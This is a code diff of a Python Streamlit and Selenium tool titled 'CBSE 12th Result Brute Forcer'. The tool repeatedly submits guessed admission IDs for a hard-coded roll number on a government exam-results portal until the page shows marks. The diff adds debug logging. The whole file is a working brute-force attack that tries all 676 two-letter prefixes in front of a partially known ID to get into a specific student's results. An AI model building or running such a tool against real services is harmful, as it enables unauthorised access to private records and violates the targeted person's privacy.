@@ -5,13 +5,7 @@ from selenium.common.exceptions import NoSuchElementException
 import time
 import string
 
-# ========================= CONFIGURATION =========================
 URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"
-
-FIELD1_VALUE = "18615900"
-KNOWN_LAST_6 = "004511"
-DELAY_BETWEEN_ATTEMPTS = 3.0
-# ============================================================
 
 def get_driver():
     options = webdriver.ChromeOptions()
@@ -23,42 +17,47 @@ def get_driver():
     return webdriver.Chrome(options=options)
 
 def is_success(driver):
-    """EXACT same function as your local code"""
+    debug_info = {"error_text": "", "has_result_keywords": False, "page_length": 0}
+    
     try:
-        # Look for error message
+        # Check error message
         try:
             error_elem = driver.find_element(By.ID, "err_msg")
-            if error_elem.is_displayed() and error_elem.text.strip():
-                return False
+            if error_elem.is_displayed():
+                debug_info["error_text"] = error_elem.text.strip()
+                if debug_info["error_text"]:
+                    return False, debug_info
         except NoSuchElementException:
-            pass  # No error element = good sign
-        
-        # Alternative success checks
-        try:
-            success_indicators = ["marks", "result", "subject", "grade", "total"]
-            page_text = driver.page_source.lower()
-            if any(ind in page_text for ind in success_indicators):
-                return True
+            debug_info["error_text"] = "No err_msg element"
         except:
-            pass
-            
-        # URL changed
+            debug_info["error_text"] = "Error finding err_msg"
+
+        # Success checks
+        page_text = driver.page_source.lower()
+        debug_info["page_length"] = len(driver.page_source)
+        
+        success_indicators = ["marks", "result", "subject", "grade", "total", "percentage"]
+        debug_info["has_result_keywords"] = any(ind in page_text for ind in success_indicators)
+
+        if debug_info["has_result_keywords"]:
+            return True, debug_info
+
         if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
-            return True
-            
-    except Exception:
-        pass
+            return True, debug_info
+
+    except Exception as e:
+        debug_info["error_text"] = f"Exception: {str(e)}"
     
-    return False  # Default: assume failed
+    return False, debug_info
 
 
-# ====================== STREAMLIT UI ======================
+# ====================== UI ======================
 st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
-st.title("🔍 CBSE 12th Result Brute Forcer")
+st.title("🔍 CBSE 12th Result Brute Forcer - Debug Mode")
 
-roll_number = st.text_input("Roll Number", value=FIELD1_VALUE)
-known_last_6 = st.text_input("Known Last 6 Characters", value=KNOWN_LAST_6, max_chars=6)
-delay = st.slider("Delay between attempts (seconds)", 2.0, 6.0, DELAY_BETWEEN_ATTEMPTS, 0.5)
+roll_number = st.text_input("Roll Number", value="18615900")
+known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
+delay = st.slider("Delay between attempts (seconds)", 2.0, 5.0, 2.8, 0.1)
 
 if st.button("🚀 Start Brute Force", type="primary"):
     if len(known_last_6) != 6:
@@ -67,6 +66,7 @@ if st.button("🚀 Start Brute Force", type="primary"):
         status = st.empty()
         progress = st.empty()
         result_box = st.empty()
+        debug_expander = st.expander("🔍 Debug Log (Click to expand)", expanded=True)
 
         driver = None
         try:
@@ -86,34 +86,39 @@ if st.button("🚀 Start Brute Force", type="primary"):
                     progress.info(f"Progress: {count}/676 | Trying: {attempt} → {code}")
 
                     try:
-                        # Exact same style as your local code
                         driver.find_element(By.ID, "rroll").clear()
                         driver.find_element(By.ID, "rroll").send_keys(roll_number)
-                        
+
                         driver.find_element(By.ID, "admn_id").clear()
                         driver.find_element(By.ID, "admn_id").send_keys(code)
-                        
+
                         driver.find_element(By.ID, "submit").click()
-                        
                         time.sleep(delay)
 
-                        if is_success(driver):
-                            result_box.success(f"""
-                            SUCCESS FOUND!
+                        success, debug_info = is_success(driver)
 
-                            Full Code: {code}
-                            Prefix: {attempt}
+                        # Log for debugging
+                        log_msg = f"{attempt} | Success: {success} | Error: {debug_info['error_text'][:80]} | Keywords: {debug_info['has_result_keywords']} | Length: {debug_info['page_length']}"
+                        debug_expander.write(log_msg)
+
+                        if success:
+                            result_box.success(f"""
+                            🎉 SUCCESS FOUND!
+
+                            Full Code: **{code}**
+                            Prefix: **{attempt}**
                             """)
                             st.balloons()
                             break
-                    except:
+                    except Exception as e:
+                        debug_expander.write(f"{attempt} → Exception: {str(e)}")
                         continue
 
             else:
                 st.error("❌ Finished all 676 attempts without success.")
 
         except Exception as e:
-            st.error(f"Error: {str(e)}")
+            st.error(f"Critical Error: {str(e)}")
         finally:
             if driver:
                 driver.quit()
